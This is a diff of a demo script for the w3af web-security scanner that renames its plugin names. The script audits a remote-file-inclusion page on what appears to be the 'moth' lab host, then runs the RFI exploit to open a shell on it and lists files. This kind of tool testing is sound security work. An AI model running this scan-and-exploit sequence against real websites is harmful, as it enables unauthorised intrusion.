@@ -1,14 +1,14 @@
-# This is the remoteFileInclude demo:
+# This is the rfi demo:
 
 plugins
-audit remoteFileInclude
-audit config remoteFileInclude
+audit rfi
+audit config rfi
 view
 set usew3afSite True
 back
-output console,textFile
+output console,text_file
 output
-output config textFile
+output config text_file
 set fileName output-w3af.txt
 set verbose True
 back
@@ -18,8 +18,8 @@ set target http://moth/w3af/remoteFileInclusion/vulnerable.php?file=f0as9
 back
 start
 exploit
-exploit config remoteFileIncludeShell
+exploit config rfi
 set listenAddress 127.0.0.1
 back
-exploit remoteFileIncludeShell
+exploit rfi
 ls
